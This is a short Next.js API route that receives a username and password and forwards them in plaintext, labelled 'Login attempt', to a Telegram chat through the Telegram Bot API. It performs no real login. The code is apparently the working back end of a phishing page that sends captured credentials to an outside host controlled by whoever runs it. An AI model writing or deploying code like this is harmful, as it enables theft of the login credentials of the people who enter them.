import { NextResponse } from "next/server"

export async function POST(req) {
  const { username, password, chatId } = await req.json()

  const message = `Login attempt:
Username: ${username}
Password: ${password}`

  try {
    const response = await fetch(`https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })

    if (response.ok) {
      return NextResponse.json({ success: true })
    } else {
      return NextResponse.json({ success: false }, { status: 500 })
    }
  } catch (error) {
    console.error("Error sending message to Telegram:", error)
    return NextResponse.json({ success: false }, { status: 500 })
  }
}

